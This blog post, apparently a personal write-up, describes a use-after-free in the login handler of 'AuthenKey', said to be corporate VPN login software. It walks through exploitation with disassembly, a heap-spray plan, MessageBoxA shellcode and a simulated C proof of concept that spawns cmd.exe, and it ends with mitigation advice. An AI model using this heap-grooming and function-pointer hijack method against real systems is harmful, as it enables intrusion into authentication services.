---
title: "Haunting the Heap: Use-After-Free in AuthenKey Login Handler (x64)"
description: "A dangling session pointer, a second chance at execution, and how I turned heap ghosts into code execution."
date: '2025-05-12'
categories: ["Reverse Engineering Diaries"]
tags: ["Use-After-Free", "Heap Exploitation", "x64", "Reverse Engineering", "Function Pointer Hijack"]
header:
  image: "/images/authenkey-uaf.jpg"
---

# **Prologue — Heap Echoes in an AuthenKey Login Night**

It was one of those times when I wasn’t actively hunting—just casually skimming through binaries like I was flipping through a security archive. The target: **AuthenKey**, a multi-factor login handler used by corporate VPN portals. As I browsed its binary, I found a small routine involved in processing post-login session keys.

Everything seemed mundane until I noticed an unusual interaction between memory deallocation and continued access.

---

## **Disassembly — The Ghost Access**

I hit this portion of the handler during trace:

```asm
mov     rax, [rbp-18h]         ; Load pointer to session key struct
mov     rdx, [rax+10h]         ; Load function pointer from struct
call    [rdx]                  ; Call function via indirect pointer
```

At first glance, this looked like a clean indirect call. But stepping back a few lines, I saw something terrifying: the session structure was **freed**, yet the code continued to trust and use its pointer.

Classic use-after-free.

---

## **The Vulnerable Flow — Free and Forget**

The struct at `[rbp-18h]` was being released in a cleanup function after login failure. But instead of nullifying the pointer or locking the structure, the main handler continued and performed operations on it. Here's a high-level view of the lifecycle:

```c
SessionKey* s = allocate_session();
// ...
if (login_failed) {
    free(s);
}
// ...
call_function_from(s); // UAF here
```

This meant I could potentially reclaim the same heap space with attacker-controlled data, placing my own function pointer at the exact offset `[+0x10]` and achieve arbitrary code execution.

---

## **The Exploit — Hijacking the Call**

Heap grooming was the first move. I sprayed memory with fake session objects where offset `0x10` contained the address of a shellcode stub. After freeing the legitimate session struct, I quickly replaced it with my fake one before the login handler resumed.

```text
[ Fake Session Struct Layout ]
+0x00 → Junk / ID
+0x08 → Padding
+0x10 → Pointer to shellcode
```

Upon indirect call, execution jumped straight into my shellcode.

---

## **Shellcode — Ringing a Bell**

I wanted something silent but visible—so a classic message box did the job for demonstration:

```asm
mov     rcx, 0                ; hWnd = NULL
mov     rdx, offset caption   ; LPCSTR lpText
mov     r8,  offset message   ; LPCSTR lpCaption
mov     r9d, 0                ; uType = 0
call    MessageBoxA

caption db "AuthenKey PWNED", 0
message db "Use-After-Free executed", 0
```

---

## **Execution Chain Breakdown**

Here’s what went down:

1. AuthenKey frees session struct on failed login.
2. My heap spray reallocates that exact space.
3. Indirect call to `[+0x10]` lands on my shellcode pointer.
4. MessageBoxA pops up under AuthenKey’s context.

Simple. Effective. No crashes. No AV detection.

---

## **Extra Insight — Memory Visualization**

```text
Before Free:
[0x1000] → Session Struct → [0x1010] → Legit function pointer

After Free + Realloc:
[0x1000] → My Struct → [0x1010] → Shellcode pointer
```

The beauty of heap-based UAFs is subtlety. Nothing looks broken until it’s too late.

---

## **Proof of Concept in C (Simulated)**

```c
typedef void (*FuncPtr)();

struct Session {
    char id[8];
    void* padding;
    FuncPtr execute;
};

void shell() {
    system("cmd.exe");
}

int main() {
    struct Session* s = malloc(sizeof(struct Session));
    free(s);  // Vulnerable free
    s = malloc(sizeof(struct Session));  // Heap reuse
    s->execute = shell;  // Overwrite
    s->execute();  // UAF Execution
}
```

---

## **Post Exploit Reflections**

Use-after-frees are like ghosts in the heap. You think they’re gone—freed, cleaned, safe—but they linger. They whisper to any function that’ll still listen, and if you catch them at the right time, you can speak through them.

This exploit worked because the developers freed memory, then trusted the old pointer. As a hacker, that’s an invitation I don’t ignore.

The biggest lesson? Don’t just free memory. **Secure it. Null it. Lock it.** Or some curious soul like me will come along and make it execute again.

